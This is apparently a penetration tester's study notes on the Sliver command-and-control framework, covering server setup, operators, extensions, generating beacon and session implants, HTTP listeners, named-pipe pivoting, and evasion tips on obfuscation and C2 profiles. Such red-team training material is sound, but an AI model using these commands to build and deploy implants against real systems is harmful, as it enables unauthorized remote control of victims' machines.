[Sliver](https://github.com/BishopFox/sliver) is a command and control software developed by [BishopFox](https://bishopfox.com/). Used by penetration testers and red teamers, its client, server, and beacons (known as implants) are written in [Golang](https://go.dev/) - making it easy to cross-compile for different platforms.

## Initial Setup
Use this releases page to download servers / clients https://github.com/BishopFox/sliver/releases

> **NOTE:** Servers and client versions must MATCH

My own specific use-case
```bash
PATH=/usr/local/bin:$PATH sliver-server
```

Setup
```bash
# Server Setup
wget -q <link>
chmod +x ./sliver-server_linux

./sliver-server_linux

# Help
[server] sliver > help              # List of available commands
[server] sliver > help <command>    # Detailed information of each command

# Setup Operator profile 
[server] sliver > new-operator -n <name> -l <lhost>
[*] Saved new client config to: /path/to/<name>_<lhost>.cfg 

# Client setup
chmod +x ./sliver-client_linux
./sliver-client_linux import <name>_<lhost>.cfg # client requires operator config
./sliver-client_linux                           # run
```

Multiplayer Mode
```bash
# Start
[server] sliver > multiplayer 

# Commands related to multiplayer
kick-operator  # Kick an operator from the server
multiplayer    # Enable multiplayer mode
new-operator   # Create a new operator config file
operators      # Manage operators
```

## Armory

Pre-installed .NET binaries
```bash
sliver > armory --help              # help menu

Sub Commands:
=============
  install  # Install an alias or extension
  search   # Search for aliases and extensions by name (regex)
  update   # Update installed an aliases and extensions

sliver > armory   # list current extensions

sliver > armory install <package>
sliver > armory install all         # install all packages
```

## Implants
Implants offer network connections on different sets of protocols and a means of communication between a C2 server and the target workstation/server. 

`Beacon` mode - operates in intervals
`Session` mode - enables immediate execution of commands by the operator
	- Session names render in **RED** → interactive
	- Beacon names render in **BLUE** → asynchronous, not interactive

Generating Implants
```bash
# Genernate implant in beacon mode
sliver > generate beacon --help    # list all flags

# Some notable options
-J / --jitter            # set up jitter time of callback
-S / --seconds           # set time interval of callback   ( default = 60 seconds )
-N / --name <name>       # name of implant
-l / --skip-symbols      # no obfuscation
-o / --os <OS>           # specify operating system ( windows / linux / mac )
-b / --http              # http connection string
-n / --dns               # dns connection string
-p / --named-pipe        # named-pipe connection strings
<SNIP>
```

Examples
```bash
# non-obfuscated implant
sliver > generate beacon --http 127.0.0.1 [--skip-symbols] -N http_beacon --os windows

# obfuscated implant
sliver > generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows

# Example
sliver > http --lport 4444   # start listener
sliver > generate beacon --http 10.10.15.5:4444 -N http-beacon
```

## Listeners
We can start a listener in Sliver based on the protocol chosen by us when we generated the binary of the implant.
```bash
# http listener
sliver > http --lport 8088

# check current listeners
sliver > jobs      # sliver operates on 31337, job ID 1 and should not be stopped
```

## Named Pipes
Named pipe is a concept for creating communication between a server and a client; this can be a process on computer A and a process on computer B. Each pipe has a unique name following the format of `\\ServerName\pipe\PipeName` or `\\.\pipe\PipeName`

In Sliver, named pipes are primarily used for pivoting on Windows.

A pivot listener is close to a bind shell; we are starting a pivot listener on Host A, and from Host B, we will connect to Host A

Used in environments where traffic routing is quite restricted

Named Pipe implants
```bash
# Enumerating named pipes
PS C:\Users\hacker> ls \\.\pipe\

# Start pipe pivot listener
[server] sliver (http_beacon) > pivots named-pipe --bind <NAME>
	[*] Started named pipe pivot listener \\.\pipe\<NAME> with id 1

# Generate pivot implant
sliver > generate --named-pipe 127.0.0.1/pipe/NAME -N pipe_<NAME> --skip-symbols
	#[*] Generating new windows/amd64 implant binary
	#[!] Symbol obfuscation is disabled
	#[*] Build completed in 1s
	#[*] Implant saved to /home/htb-ac-8414/pipe_<NAME>.exe
```



#### OPSEC
> Using HTTPS, MTLS, or WireGuard listeners adds a layer of protection
	For the HTTP(S) listener, we can make some modifications to the C2 profile file `~/.sliver/config/http-c2.json`, such as adding a legitimate request or response headers and changing filenames and extensions in URL generation. [HTTPS profile file documentation here](https://sliver.sh/docs?name=HTTPS+C2)
	
> We must understand the difference when using the `--skip-symbols` parameter. One of the main disadvantages of skipping the symbol obfuscation is that the beacon will be easily detectable as Sliver due to the imports being presented in plaintext.



## Versions

This is the newest version but will break some stuff... Perhaps better on Kali? need to test
```bash
# ── grab the correct amd64 binaries ──
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_linux-amd64

# ── install and shadow the old exegol binaries ──
chmod +x sliver-server_linux-amd64 sliver-client_linux-amd64
cp sliver-server_linux-amd64 /usr/local/bin/sliver-server
cp sliver-client_linux-amd64 /usr/local/bin/sliver-client
ln -sf /usr/local/bin/sliver-server /opt/tools/bin/sliver-server
ln -sf /usr/local/bin/sliver-client /opt/tools/bin/sliver-client

# ── confirm ──
which sliver-server && sliver-server version
```